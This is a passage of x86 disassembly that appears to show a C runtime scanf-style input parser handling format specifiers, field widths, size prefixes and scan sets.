  40194a:	ret    
  40194b:	push   edx
  40194c:	call   0x4031ab
  401951:	pop    ecx
  401952:	ret    
  401953:	push   0x1c8
  401958:	push   0x426140
  40195d:	call   0x4030a4
  401962:	mov    eax,ds:0x4282a8
  401967:	xor    eax,DWORD PTR [ebp+0x4]
  40196a:	mov    DWORD PTR [ebp-0x1c],eax
  40196d:	xor    eax,eax
  40196f:	mov    DWORD PTR [ebp-0x20],eax
  401972:	mov    DWORD PTR [ebp-0x24],eax
  401975:	mov    DWORD PTR [ebp-0x28],eax
  401978:	and    BYTE PTR [ebp-0x29],al
  40197b:	mov    DWORD PTR [ebp-0x30],eax
  40197e:	mov    DWORD PTR [ebp-0x34],eax
  401981:	mov    esi,DWORD PTR [ebp+0xc]
  401984:	mov    al,BYTE PTR [esi]
  401986:	test   al,al
  401988:	je     0x4024b2
  40198e:	movzx  eax,al
  401991:	cmp    DWORD PTR ds:0x428278,0x1
  401998:	jle    0x4019a6
  40199a:	push   0x8
  40199c:	push   eax
  40199d:	call   0x40312d
  4019a2:	pop    ecx
  4019a3:	pop    ecx
  4019a4:	jmp    0x4019b3
  4019a6:	mov    ecx,DWORD PTR ds:0x428270
  4019ac:	movzx  eax,BYTE PTR [ecx+eax*2]
  4019b0:	and    eax,0x8
  4019b3:	xor    edi,edi
  4019b5:	cmp    eax,edi
  4019b7:	je     0x4019fa
  4019b9:	dec    DWORD PTR [ebp-0x30]
  4019bc:	inc    DWORD PTR [ebp-0x30]
  4019bf:	mov    edx,DWORD PTR [ebp+0x8]
  4019c2:	call   0x40193d
  4019c7:	mov    esi,eax
  4019c9:	push   esi
  4019ca:	call   0x4032f5
  4019cf:	pop    ecx
  4019d0:	test   eax,eax
  4019d2:	jne    0x4019bc
  4019d4:	cmp    esi,0xffffffff
  4019d7:	je     0x4019e4
  4019d9:	push   DWORD PTR [ebp+0x8]
  4019dc:	push   esi
  4019dd:	call   0x403289
  4019e2:	pop    ecx
  4019e3:	pop    ecx
  4019e4:	inc    DWORD PTR [ebp+0xc]
  4019e7:	mov    eax,DWORD PTR [ebp+0xc]
  4019ea:	movzx  eax,BYTE PTR [eax]
  4019ed:	push   eax
  4019ee:	call   0x4032f5
  4019f3:	pop    ecx
  4019f4:	test   eax,eax
  4019f6:	jne    0x4019e4
  4019f8:	jmp    0x401981
  4019fa:	mov    esi,DWORD PTR [ebp+0xc]
  4019fd:	cmp    BYTE PTR [esi],0x25
  401a00:	jne    0x40242e
  401a06:	mov    DWORD PTR [ebp-0x38],edi
  401a09:	and    BYTE PTR [ebp-0x39],0x0
  401a0d:	mov    DWORD PTR [ebp-0x40],edi
  401a10:	mov    DWORD PTR [ebp-0x44],edi
  401a13:	mov    DWORD PTR [ebp-0x48],edi
  401a16:	and    BYTE PTR [ebp-0x49],0x0
  401a1a:	and    BYTE PTR [ebp-0x4a],0x0
  401a1e:	and    BYTE PTR [ebp-0x4b],0x0
  401a22:	and    BYTE PTR [ebp-0x4c],0x0
  401a26:	and    BYTE PTR [ebp-0x4d],0x0
  401a2a:	and    BYTE PTR [ebp-0x4e],0x0
  401a2e:	mov    BYTE PTR [ebp-0x4f],0x1
  401a32:	mov    DWORD PTR [ebp-0x54],edi
  401a35:	inc    esi
  401a36:	movzx  ebx,BYTE PTR [esi]
  401a39:	movzx  eax,bl
  401a3c:	cmp    DWORD PTR ds:0x428278,0x1
  401a43:	jle    0x401a51
  401a45:	push   0x4
  401a47:	push   eax
  401a48:	call   0x40312d
  401a4d:	pop    ecx
  401a4e:	pop    ecx
  401a4f:	jmp    0x401a5e
  401a51:	mov    ecx,DWORD PTR ds:0x428270
  401a57:	movzx  eax,BYTE PTR [ecx+eax*2]
  401a5b:	and    eax,0x4
  401a5e:	test   eax,eax
  401a60:	je     0x401a71
  401a62:	inc    DWORD PTR [ebp-0x44]
  401a65:	lea    eax,[edi+edi*4]
  401a68:	lea    edi,[ebx+eax*2-0x30]
  401a6c:	jmp    0x401b0b
  401a71:	cmp    ebx,0x4e
  401a74:	jg     0x401ae9
  401a76:	je     0x401b0b
  401a7c:	cmp    ebx,0x2a
  401a7f:	je     0x401ae4
  401a81:	cmp    ebx,0x46
  401a84:	je     0x401b0b
  401a8a:	cmp    ebx,0x49
  401a8d:	je     0x401a99
  401a8f:	cmp    ebx,0x4c
  401a92:	jne    0x401af8
  401a94:	inc    BYTE PTR [ebp-0x4f]
  401a97:	jmp    0x401b0b
  401a99:	mov    cl,BYTE PTR [esi+0x1]
  401a9c:	cmp    cl,0x36
  401a9f:	jne    0x401ab8
  401aa1:	lea    eax,[esi+0x2]
  401aa4:	cmp    BYTE PTR [eax],0x34
  401aa7:	jne    0x401ab8
  401aa9:	mov    esi,eax
  401aab:	inc    DWORD PTR [ebp-0x54]
  401aae:	and    DWORD PTR [ebp-0x5c],0x0
  401ab2:	and    DWORD PTR [ebp-0x58],0x0
  401ab6:	jmp    0x401b0b
  401ab8:	cmp    cl,0x33
  401abb:	jne    0x401ac9
  401abd:	lea    eax,[esi+0x2]
  401ac0:	cmp    BYTE PTR [eax],0x32
  401ac3:	jne    0x401ac9
  401ac5:	mov    esi,eax
  401ac7:	jmp    0x401b0b
  401ac9:	cmp    cl,0x64
  401acc:	je     0x401b0b
  401ace:	cmp    cl,0x69
  401ad1:	je     0x401b0b
  401ad3:	cmp    cl,0x6f
  401ad6:	je     0x401b0b
  401ad8:	cmp    cl,0x78
  401adb:	je     0x401b0b
  401add:	cmp    cl,0x58
  401ae0:	jne    0x401af8
  401ae2:	jmp    0x401b0b
  401ae4:	inc    BYTE PTR [ebp-0x4b]
  401ae7:	jmp    0x401b0b
  401ae9:	cmp    ebx,0x68
  401aec:	je     0x401b05
  401aee:	cmp    ebx,0x6c
  401af1:	je     0x401afd
  401af3:	cmp    ebx,0x77
  401af6:	je     0x401b00
  401af8:	inc    BYTE PTR [ebp-0x4c]
  401afb:	jmp    0x401b0b
  401afd:	inc    BYTE PTR [ebp-0x4f]
  401b00:	inc    BYTE PTR [ebp-0x4e]
  401b03:	jmp    0x401b0b
  401b05:	dec    BYTE PTR [ebp-0x4f]
  401b08:	dec    BYTE PTR [ebp-0x4e]
  401b0b:	cmp    BYTE PTR [ebp-0x4c],0x0
  401b0f:	je     0x401a35
  401b15:	mov    DWORD PTR [ebp-0x48],edi
  401b18:	mov    DWORD PTR [ebp+0xc],esi
  401b1b:	cmp    BYTE PTR [ebp-0x4b],0x0
  401b1f:	jne    0x401b35
  401b21:	mov    eax,DWORD PTR [ebp+0x10]
  401b24:	mov    DWORD PTR [ebp-0x60],eax
  401b27:	add    eax,0x4
  401b2a:	mov    DWORD PTR [ebp+0x10],eax
  401b2d:	mov    ebx,DWORD PTR [eax-0x4]
  401b30:	mov    DWORD PTR [ebp-0x64],ebx
  401b33:	jmp    0x401b38
  401b35:	mov    ebx,DWORD PTR [ebp-0x64]
  401b38:	and    BYTE PTR [ebp-0x4c],0x0
  401b3c:	cmp    BYTE PTR [ebp-0x4e],0x0
  401b40:	jne    0x401b56
  401b42:	mov    al,BYTE PTR [esi]
  401b44:	cmp    al,0x53
  401b46:	je     0x401b52
  401b48:	cmp    al,0x43
  401b4a:	je     0x401b52
  401b4c:	or     BYTE PTR [ebp-0x4e],0xff
  401b50:	jmp    0x401b56
  401b52:	mov    BYTE PTR [ebp-0x4e],0x1
  401b56:	movzx  edi,BYTE PTR [esi]
  401b59:	or     edi,0x20
  401b5c:	mov    DWORD PTR [ebp-0x68],edi
  401b5f:	cmp    edi,0x6e
  401b62:	je     0x401b9c
  401b64:	cmp    edi,0x63
  401b67:	je     0x401b8e
  401b69:	cmp    edi,0x7b
  401b6c:	je     0x401b8e
  401b6e:	inc    DWORD PTR [ebp-0x30]
  401b71:	mov    edx,DWORD PTR [ebp+0x8]
  401b74:	call   0x40193d
  401b79:	mov    esi,eax
  401b7b:	push   esi
  401b7c:	call   0x4032f5
  401b81:	pop    ecx
  401b82:	test   eax,eax
  401b84:	jne    0x401b6e
  401b86:	mov    DWORD PTR [ebp-0x28],esi
  401b89:	mov    esi,DWORD PTR [ebp+0xc]
  401b8c:	jmp    0x401b9c
  401b8e:	inc    DWORD PTR [ebp-0x30]
  401b91:	mov    edx,DWORD PTR [ebp+0x8]
  401b94:	call   0x40193d
  401b99:	mov    DWORD PTR [ebp-0x28],eax
  401b9c:	mov    ecx,DWORD PTR [ebp-0x44]
  401b9f:	test   ecx,ecx
  401ba1:	je     0x401bad
  401ba3:	cmp    DWORD PTR [ebp-0x48],0x0
  401ba7:	je     0x401e45
  401bad:	cmp    edi,0x6f
  401bb0:	jg     0x401e17
  401bb6:	je     0x40218c
  401bbc:	cmp    edi,0x63
  401bbf:	je     0x401df6
  401bc5:	cmp    edi,0x64
  401bc8:	je     0x40218c
  401bce:	jle    0x401e3d
  401bd4:	cmp    edi,0x67
  401bd7:	jle    0x401c11
  401bd9:	cmp    edi,0x69
  401bdc:	je     0x401bf9
  401bde:	cmp    edi,0x6e
  401be1:	jne    0x401e3d
  401be7:	mov    eax,DWORD PTR [ebp-0x30]
  401bea:	cmp    BYTE PTR [ebp-0x4b],0x0
  401bee:	je     0x402403
  401bf4:	jmp    0x402423
  401bf9:	push   0x64
  401bfb:	pop    edi
  401bfc:	mov    ebx,DWORD PTR [ebp-0x28]
  401bff:	cmp    ebx,0x2d
  401c02:	jne    0x402080
  401c08:	mov    BYTE PTR [ebp-0x4a],0x1
  401c0c:	jmp    0x402085
  401c11:	lea    esi,[ebp-0x1c8]
  401c17:	mov    ebx,DWORD PTR [ebp-0x28]
  401c1a:	cmp    ebx,0x2d
  401c1d:	jne    0x401c2d
  401c1f:	mov    BYTE PTR [ebp-0x1c8],bl
  401c25:	lea    esi,[ebp-0x1c7]
  401c2b:	jmp    0x401c32
  401c2d:	cmp    ebx,0x2b
  401c30:	jne    0x401c49
  401c32:	dec    DWORD PTR [ebp-0x48]
  401c35:	inc    DWORD PTR [ebp-0x30]
  401c38:	mov    edi,DWORD PTR [ebp+0x8]
  401c3b:	mov    edx,edi
  401c3d:	call   0x40193d
  401c42:	mov    ebx,eax
  401c44:	mov    DWORD PTR [ebp-0x28],ebx
  401c47:	jmp    0x401c4c
  401c49:	mov    edi,DWORD PTR [ebp+0x8]
  401c4c:	cmp    DWORD PTR [ebp-0x44],0x0
  401c50:	je     0x401c5b
  401c52:	cmp    DWORD PTR [ebp-0x48],0x15d
  401c59:	jle    0x401c62
  401c5b:	mov    DWORD PTR [ebp-0x48],0x15d
  401c62:	cmp    DWORD PTR ds:0x428278,0x1
  401c69:	jle    0x401c77
  401c6b:	push   0x4
  401c6d:	push   ebx
  401c6e:	call   0x40312d
  401c73:	pop    ecx
  401c74:	pop    ecx
  401c75:	jmp    0x401c83
  401c77:	mov    eax,ds:0x428270
  401c7c:	movzx  eax,BYTE PTR [eax+ebx*2]
  401c80:	and    eax,0x4
  401c83:	test   eax,eax
  401c85:	je     0x401ca8
  401c87:	mov    eax,DWORD PTR [ebp-0x48]
  401c8a:	dec    DWORD PTR [ebp-0x48]
  401c8d:	test   eax,eax
  401c8f:	je     0x401ca8
  401c91:	inc    DWORD PTR [ebp-0x40]
  401c94:	mov    BYTE PTR [esi],bl
  401c96:	inc    esi
  401c97:	inc    DWORD PTR [ebp-0x30]
  401c9a:	mov    edx,edi
  401c9c:	call   0x40193d
  401ca1:	mov    ebx,eax
  401ca3:	mov    DWORD PTR [ebp-0x28],ebx
  401ca6:	jmp    0x401c62
  401ca8:	cmp    BYTE PTR ds:0x42827c,bl
  401cae:	jne    0x401d14
  401cb0:	mov    eax,DWORD PTR [ebp-0x48]
  401cb3:	dec    DWORD PTR [ebp-0x48]
  401cb6:	test   eax,eax
  401cb8:	je     0x401d14
  401cba:	inc    DWORD PTR [ebp-0x30]
  401cbd:	mov    edx,edi
  401cbf:	call   0x40193d
  401cc4:	mov    ebx,eax
  401cc6:	mov    al,ds:0x42827c
  401ccb:	mov    BYTE PTR [esi],al
  401ccd:	inc    esi
  401cce:	mov    DWORD PTR [ebp-0x28],ebx
  401cd1:	cmp    DWORD PTR ds:0x428278,0x1
  401cd8:	jle    0x401ce6
  401cda:	push   0x4
  401cdc:	push   ebx
  401cdd:	call   0x40312d
  401ce2:	pop    ecx
  401ce3:	pop    ecx
  401ce4:	jmp    0x401cf2
  401ce6:	mov    eax,ds:0x428270
  401ceb:	movzx  eax,BYTE PTR [eax+ebx*2]
  401cef:	and    eax,0x4
  401cf2:	test   eax,eax
  401cf4:	je     0x401d14
  401cf6:	mov    eax,DWORD PTR [ebp-0x48]
  401cf9:	dec    DWORD PTR [ebp-0x48]
  401cfc:	test   eax,eax
  401cfe:	je     0x401d14
  401d00:	inc    DWORD PTR [ebp-0x40]
  401d03:	mov    BYTE PTR [esi],bl
  401d05:	inc    esi
  401d06:	inc    DWORD PTR [ebp-0x30]
  401d09:	mov    edx,edi
  401d0b:	call   0x40193d
  401d10:	mov    ebx,eax
  401d12:	jmp    0x401cce
  401d14:	cmp    DWORD PTR [ebp-0x40],0x0
  401d18:	je     0x401dad
  401d1e:	cmp    ebx,0x65
  401d21:	je     0x401d2c
  401d23:	cmp    ebx,0x45
  401d26:	jne    0x401dad
  401d2c:	mov    eax,DWORD PTR [ebp-0x48]
  401d2f:	dec    DWORD PTR [ebp-0x48]
  401d32:	test   eax,eax
  401d34:	je     0x401dad
  401d36:	mov    BYTE PTR [esi],0x65
  401d39:	inc    esi
  401d3a:	inc    DWORD PTR [ebp-0x30]
  401d3d:	mov    edx,edi
  401d3f:	call   0x40193d
  401d44:	mov    ebx,eax
  401d46:	mov    DWORD PTR [ebp-0x28],ebx
  401d49:	cmp    ebx,0x2d
  401d4c:	jne    0x401d53
  401d4e:	mov    BYTE PTR [esi],al
  401d50:	inc    esi
  401d51:	jmp    0x401d58
  401d53:	cmp    ebx,0x2b
  401d56:	jne    0x401d76
  401d58:	mov    eax,DWORD PTR [ebp-0x48]
  401d5b:	dec    DWORD PTR [ebp-0x48]
  401d5e:	test   eax,eax
  401d60:	jne    0x401d67
  401d62:	and    DWORD PTR [ebp-0x48],eax
  401d65:	jmp    0x401d76
  401d67:	mov    edx,edi
  401d69:	inc    DWORD PTR [ebp-0x30]
  401d6c:	call   0x40193d
  401d71:	mov    ebx,eax
  401d73:	mov    DWORD PTR [ebp-0x28],ebx
  401d76:	cmp    DWORD PTR ds:0x428278,0x1
  401d7d:	jle    0x401d8b
  401d7f:	push   0x4
  401d81:	push   ebx
  401d82:	call   0x40312d
  401d87:	pop    ecx
  401d88:	pop    ecx
  401d89:	jmp    0x401d97
  401d8b:	mov    eax,ds:0x428270
  401d90:	movzx  eax,BYTE PTR [eax+ebx*2]
  401d94:	and    eax,0x4
  401d97:	test   eax,eax
  401d99:	je     0x401dad
  401d9b:	mov    eax,DWORD PTR [ebp-0x48]
  401d9e:	dec    DWORD PTR [ebp-0x48]
  401da1:	test   eax,eax
  401da3:	je     0x401dad
  401da5:	inc    DWORD PTR [ebp-0x40]
  401da8:	mov    BYTE PTR [esi],bl
  401daa:	inc    esi
  401dab:	jmp    0x401d67
  401dad:	dec    DWORD PTR [ebp-0x30]
  401db0:	cmp    ebx,0xffffffff
  401db3:	je     0x401dbe
  401db5:	push   edi
  401db6:	push   ebx
  401db7:	call   0x403289
  401dbc:	pop    ecx
  401dbd:	pop    ecx
  401dbe:	cmp    DWORD PTR [ebp-0x40],0x0
  401dc2:	je     0x4024b2
  401dc8:	cmp    BYTE PTR [ebp-0x4b],0x0
  401dcc:	jne    0x402423
  401dd2:	inc    DWORD PTR [ebp-0x34]
  401dd5:	and    BYTE PTR [esi],0x0
  401dd8:	lea    eax,[ebp-0x1c8]
  401dde:	push   eax
  401ddf:	push   DWORD PTR [ebp-0x64]
  401de2:	movsx  eax,BYTE PTR [ebp-0x4f]
  401de6:	dec    eax
  401de7:	push   eax
  401de8:	call   DWORD PTR ds:0x428298
  401dee:	add    esp,0xc
  401df1:	jmp    0x402423
  401df6:	test   ecx,ecx
  401df8:	jne    0x401e04
  401dfa:	mov    DWORD PTR [ebp-0x44],0x1
  401e01:	inc    DWORD PTR [ebp-0x48]
  401e04:	cmp    BYTE PTR [ebp-0x4e],0x0
  401e08:	jle    0x401f8c
  401e0e:	mov    BYTE PTR [ebp-0x4d],0x1
  401e12:	jmp    0x401f8c
  401e17:	mov    eax,edi
  401e19:	sub    eax,0x70
  401e1c:	je     0x402188
  401e22:	sub    eax,0x3
  401e25:	je     0x401e04
  401e27:	dec    eax
  401e28:	dec    eax
  401e29:	je     0x40218c
  401e2f:	sub    eax,0x3
  401e32:	je     0x401bfc
  401e38:	sub    eax,0x3
  401e3b:	je     0x401e66
  401e3d:	movzx  eax,BYTE PTR [esi]
  401e40:	cmp    eax,DWORD PTR [ebp-0x28]
  401e43:	je     0x401e4e
  401e45:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  401e49:	jmp    0x402482
  401e4e:	dec    BYTE PTR [ebp-0x29]
  401e51:	cmp    BYTE PTR [ebp-0x4b],0x0
  401e55:	jne    0x402423
  401e5b:	mov    eax,DWORD PTR [ebp-0x60]
  401e5e:	mov    DWORD PTR [ebp+0x10],eax
  401e61:	jmp    0x402423
  401e66:	cmp    BYTE PTR [ebp-0x4e],0x0
  401e6a:	jle    0x401e70
  401e6c:	mov    BYTE PTR [ebp-0x4d],0x1
  401e70:	mov    edi,DWORD PTR [ebp+0xc]
  401e73:	inc    edi
  401e74:	mov    DWORD PTR [ebp+0xc],edi
  401e77:	mov    DWORD PTR [ebp-0x1cc],edi
  401e7d:	cmp    BYTE PTR [edi],0x5e
  401e80:	jne    0x401e8d
  401e82:	inc    edi
  401e83:	mov    DWORD PTR [ebp-0x1cc],edi
  401e89:	or     BYTE PTR [ebp-0x49],0xff
  401e8d:	mov    ebx,DWORD PTR [ebp-0x20]
  401e90:	test   ebx,ebx
  401e92:	jne    0x401ee5
  401e94:	and    DWORD PTR [ebp-0x4],ebx
  401e97:	push   0x20
  401e99:	pop    eax
  401e9a:	call   0x4030f0
  401e9f:	mov    DWORD PTR [ebp-0x18],esp
  401ea2:	mov    ebx,esp
  401ea4:	mov    DWORD PTR [ebp-0x20],ebx
  401ea7:	or     DWORD PTR [ebp-0x4],0xffffffff
  401eab:	jmp    0x401ee5
  401ead:	xor    eax,eax
  401eaf:	inc    eax
  401eb0:	ret    
  401eb1:	mov    esp,DWORD PTR [ebp-0x18]
  401eb4:	call   0x403504
  401eb9:	push   0x20
  401ebb:	call   0x4034f2
  401ec0:	pop    ecx
  401ec1:	mov    DWORD PTR [ebp-0x20],eax
  401ec4:	test   eax,eax
  401ec6:	jne    0x401ed1
  401ec8:	or     DWORD PTR [ebp-0x4],0xffffffff
  401ecc:	jmp    0x4024b2
  401ed1:	mov    DWORD PTR [ebp-0x24],0x1
  401ed8:	or     DWORD PTR [ebp-0x4],0xffffffff
  401edc:	mov    edi,DWORD PTR [ebp-0x1cc]
  401ee2:	mov    ebx,DWORD PTR [ebp-0x20]
  401ee5:	push   0x20
  401ee7:	push   0x0
  401ee9:	push   ebx
  401eea:	call   0x403420
  401eef:	add    esp,0xc
  401ef2:	cmp    DWORD PTR [ebp-0x68],0x7b
  401ef6:	jne    0x401f6c
  401ef8:	cmp    BYTE PTR [edi],0x5d
  401efb:	jne    0x401f6c
  401efd:	mov    dl,0x5d
  401eff:	inc    edi
  401f00:	mov    BYTE PTR [ebx+0xb],0x20
  401f04:	jmp    0x401f6f
  401f06:	inc    edi
  401f07:	cmp    al,0x2d
  401f09:	jne    0x401f56
  401f0b:	test   dl,dl
  401f0d:	je     0x401f56
  401f0f:	mov    cl,BYTE PTR [edi]
  401f11:	cmp    cl,0x5d
  401f14:	je     0x401f56
  401f16:	inc    edi
  401f17:	cmp    dl,cl
  401f19:	jae    0x401f1f
  401f1b:	mov    al,cl
  401f1d:	jmp    0x401f23
  401f1f:	mov    al,dl
  401f21:	mov    dl,cl
  401f23:	cmp    dl,al
  401f25:	ja     0x401f52
  401f27:	movzx  esi,dl
  401f2a:	sub    al,dl
  401f2c:	inc    al
  401f2e:	movzx  eax,al
  401f31:	mov    DWORD PTR [ebp-0x1d0],eax
  401f37:	mov    eax,esi
  401f39:	shr    eax,0x3
  401f3c:	add    eax,ebx
  401f3e:	mov    ecx,esi
  401f40:	and    ecx,0x7
  401f43:	mov    dl,0x1
  401f45:	shl    dl,cl
  401f47:	or     BYTE PTR [eax],dl
  401f49:	inc    esi
  401f4a:	dec    DWORD PTR [ebp-0x1d0]
  401f50:	jne    0x401f37
  401f52:	xor    dl,dl
  401f54:	jmp    0x401f6f
  401f56:	mov    BYTE PTR [ebp-0x39],al
  401f59:	movzx  ecx,al
  401f5c:	mov    eax,ecx
  401f5e:	shr    eax,0x3
  401f61:	add    eax,ebx
  401f63:	and    ecx,0x7
  401f66:	mov    dl,0x1
  401f68:	shl    dl,cl
  401f6a:	or     BYTE PTR [eax],dl
  401f6c:	mov    dl,BYTE PTR [ebp-0x39]
  401f6f:	mov    al,BYTE PTR [edi]
  401f71:	cmp    al,0x5d
  401f73:	jne    0x401f06
  401f75:	test   al,al
  401f77:	je     0x4024b2
  401f7d:	mov    ebx,DWORD PTR [ebp-0x64]
  401f80:	cmp    DWORD PTR [ebp-0x68],0x7b
  401f84:	jne    0x401f89
  401f86:	mov    DWORD PTR [ebp+0xc],edi
  401f89:	mov    edi,DWORD PTR [ebp-0x68]
  401f8c:	mov    esi,ebx
  401f8e:	dec    DWORD PTR [ebp-0x30]
  401f91:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  401f95:	je     0x401fa4
  401f97:	push   DWORD PTR [ebp+0x8]
  401f9a:	push   DWORD PTR [ebp-0x28]
  401f9d:	call   0x403289
  401fa2:	pop    ecx
  401fa3:	pop    ecx
  401fa4:	cmp    DWORD PTR [ebp-0x44],0x0
  401fa8:	je     0x401fb8
  401faa:	mov    eax,DWORD PTR [ebp-0x48]
  401fad:	dec    DWORD PTR [ebp-0x48]
  401fb0:	test   eax,eax
  401fb2:	je     0x40214f
  401fb8:	inc    DWORD PTR [ebp-0x30]
  401fbb:	mov    edx,DWORD PTR [ebp+0x8]
  401fbe:	call   0x40193d
  401fc3:	mov    DWORD PTR [ebp-0x28],eax
  401fc6:	cmp    eax,0xffffffff
  401fc9:	je     0x40213c
  401fcf:	cmp    edi,0x63
  401fd2:	je     0x402018
  401fd4:	cmp    edi,0x73
  401fd7:	jne    0x401fe8
  401fd9:	cmp    eax,0x9
  401fdc:	jl     0x401fe3
  401fde:	cmp    eax,0xd
  401fe1:	jle    0x401fe8
  401fe3:	cmp    eax,0x20
  401fe6:	jne    0x402018
  401fe8:	cmp    edi,0x7b
  401feb:	jne    0x40213c
  401ff1:	mov    ecx,eax
  401ff3:	and    ecx,0x7
  401ff6:	xor    edx,edx
  401ff8:	inc    edx
  401ff9:	shl    edx,cl
  401ffb:	mov    ecx,eax
  401ffd:	sar    ecx,0x3
  402000:	mov    edi,DWORD PTR [ebp-0x20]
  402003:	movsx  ecx,BYTE PTR [ecx+edi*1]
  402007:	movsx  edi,BYTE PTR [ebp-0x49]
  40200b:	xor    ecx,edi
  40200d:	test   ecx,edx
  40200f:	je     0x40213c
  402015:	mov    edi,DWORD PTR [ebp-0x68]
  402018:	cmp    BYTE PTR [ebp-0x4b],0x0
  40201c:	jne    0x402136
  402022:	cmp    BYTE PTR [ebp-0x4d],0x0
  402026:	je     0x40212b
  40202c:	mov    BYTE PTR [ebp-0x1d4],al
  402032:	movzx  eax,al
  402035:	mov    ecx,DWORD PTR ds:0x428270
  40203b:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  402040:	je     0x402053
  402042:	inc    DWORD PTR [ebp-0x30]
  402045:	mov    edx,DWORD PTR [ebp+0x8]
  402048:	call   0x40193d
  40204d:	mov    BYTE PTR [ebp-0x1d3],al
  402053:	push   DWORD PTR ds:0x428278
  402059:	lea    eax,[ebp-0x1d4]
  40205f:	push   eax
  402060:	lea    eax,[ebp-0x1d8]
  402066:	push   eax
  402067:	call   0x403356
  40206c:	add    esp,0xc
  40206f:	mov    ax,WORD PTR [ebp-0x1d8]
  402076:	mov    WORD PTR [ebx],ax
  402079:	inc    ebx
  40207a:	inc    ebx
  40207b:	jmp    0x40212e
  402080:	cmp    ebx,0x2b
  402083:	jne    0x4020a4
  402085:	dec    DWORD PTR [ebp-0x48]
  402088:	jne    0x402094
  40208a:	test   ecx,ecx
  40208c:	je     0x402094
  40208e:	mov    BYTE PTR [ebp-0x4c],0x1
  402092:	jmp    0x4020a4
  402094:	inc    DWORD PTR [ebp-0x30]
  402097:	mov    edx,DWORD PTR [ebp+0x8]
  40209a:	call   0x40193d
  40209f:	mov    ebx,eax
  4020a1:	mov    DWORD PTR [ebp-0x28],ebx
  4020a4:	cmp    ebx,0x30
  4020a7:	jne    0x4021be
  4020ad:	inc    DWORD PTR [ebp-0x30]
  4020b0:	mov    edx,DWORD PTR [ebp+0x8]
  4020b3:	call   0x40193d
  4020b8:	mov    ebx,eax
  4020ba:	mov    DWORD PTR [ebp-0x28],ebx
  4020bd:	cmp    bl,0x78
  4020c0:	je     0x402104
  4020c2:	cmp    bl,0x58
  4020c5:	je     0x402104
  4020c7:	mov    DWORD PTR [ebp-0x40],0x1
  4020ce:	cmp    edi,0x78
  4020d1:	je     0x4020e9
  4020d3:	cmp    DWORD PTR [ebp-0x44],0x0
  4020d7:	je     0x4020e1
  4020d9:	dec    DWORD PTR [ebp-0x48]
  4020dc:	jne    0x4020e1
  4020de:	inc    BYTE PTR [ebp-0x4c]
  4020e1:	push   0x6f
  4020e3:	pop    edi
  4020e4:	jmp    0x4021be
  4020e9:	dec    DWORD PTR [ebp-0x30]
  4020ec:	cmp    ebx,0xffffffff
  4020ef:	je     0x4020fc
  4020f1:	push   DWORD PTR [ebp+0x8]
  4020f4:	push   ebx
  4020f5:	call   0x403289
  4020fa:	pop    ecx
  4020fb:	pop    ecx
  4020fc:	push   0x30
  4020fe:	pop    ebx
  4020ff:	jmp    0x4021bb
  402104:	inc    DWORD PTR [ebp-0x30]
  402107:	mov    edx,DWORD PTR [ebp+0x8]
  40210a:	call   0x40193d
  40210f:	mov    ebx,eax
  402111:	mov    DWORD PTR [ebp-0x28],ebx
  402114:	cmp    DWORD PTR [ebp-0x44],0x0
  402118:	je     0x402127
  40211a:	sub    DWORD PTR [ebp-0x48],0x2
  40211e:	cmp    DWORD PTR [ebp-0x48],0x1
  402122:	jge    0x402127
  402124:	inc    BYTE PTR [ebp-0x4c]
  402127:	push   0x78
  402129:	jmp    0x4020e3
  40212b:	mov    BYTE PTR [ebx],al
  40212d:	inc    ebx
  40212e:	mov    DWORD PTR [ebp-0x64],ebx
  402131:	jmp    0x401fa4
  402136:	inc    esi
  402137:	jmp    0x401fa4
  40213c:	dec    DWORD PTR [ebp-0x30]
  40213f:	cmp    eax,0xffffffff
  402142:	je     0x40214f
  402144:	push   DWORD PTR [ebp+0x8]
  402147:	push   eax
  402148:	call   0x403289
  40214d:	pop    ecx
  40214e:	pop    ecx
  40214f:	cmp    esi,ebx
  402151:	je     0x4024b2
  402157:	cmp    BYTE PTR [ebp-0x4b],0x0
  40215b:	jne    0x402423
  402161:	inc    DWORD PTR [ebp-0x34]
  402164:	cmp    DWORD PTR [ebp-0x68],0x63
  402168:	je     0x402423
  40216e:	mov    eax,DWORD PTR [ebp-0x64]
  402171:	cmp    BYTE PTR [ebp-0x4d],0x0
  402175:	je     0x402180
  402177:	and    WORD PTR [eax],0x0
  40217b:	jmp    0x402423
  402180:	and    BYTE PTR [eax],0x0
  402183:	jmp    0x402423
  402188:	mov    BYTE PTR [ebp-0x4f],0x1
  40218c:	mov    ebx,DWORD PTR [ebp-0x28]
  40218f:	cmp    ebx,0x2d
  402192:	jne    0x40219a
  402194:	mov    BYTE PTR [ebp-0x4a],0x1
  402198:	jmp    0x40219f
  40219a:	cmp    ebx,0x2b
  40219d:	jne    0x4021be
  40219f:	dec    DWORD PTR [ebp-0x48]
  4021a2:	jne    0x4021ae
  4021a4:	test   ecx,ecx
  4021a6:	je     0x4021ae
  4021a8:	mov    BYTE PTR [ebp-0x4c],0x1
  4021ac:	jmp    0x4021be
  4021ae:	inc    DWORD PTR [ebp-0x30]
  4021b1:	mov    edx,DWORD PTR [ebp+0x8]
  4021b4:	call   0x40193d
  4021b9:	mov    ebx,eax
  4021bb:	mov    DWORD PTR [ebp-0x28],ebx
  4021be:	cmp    DWORD PTR [ebp-0x54],0x0
  4021c2:	je     0x4022f5
  4021c8:	cmp    BYTE PTR [ebp-0x4c],0x0
  4021cc:	jne    0x4022d3
  4021d2:	mov    esi,0x80
  4021d7:	cmp    edi,0x78
  4021da:	je     0x40223c
  4021dc:	cmp    edi,0x70
  4021df:	je     0x40223c
  4021e1:	cmp    DWORD PTR ds:0x428278,0x1
  4021e8:	jle    0x4021f6
  4021ea:	push   0x4
  4021ec:	push   ebx
  4021ed:	call   0x40312d
  4021f2:	pop    ecx
  4021f3:	pop    ecx
  4021f4:	jmp    0x402202
  4021f6:	mov    eax,ds:0x428270
  4021fb:	movzx  eax,BYTE PTR [eax+ebx*2]
  4021ff:	and    eax,0x4
  402202:	test   eax,eax
  402204:	je     0x40227d
  402206:	cmp    edi,0x6f
  402209:	jne    0x402225
  40220b:	cmp    ebx,0x38
  40220e:	jge    0x40227d
  402210:	mov    eax,DWORD PTR [ebp-0x5c]
  402213:	mov    ecx,DWORD PTR [ebp-0x58]
  402216:	shld   ecx,eax,0x3
  40221a:	shl    eax,0x3
  40221d:	mov    DWORD PTR [ebp-0x5c],eax
  402220:	mov    DWORD PTR [ebp-0x58],ecx
  402223:	jmp    0x402280
  402225:	push   0x0
  402227:	push   0xa
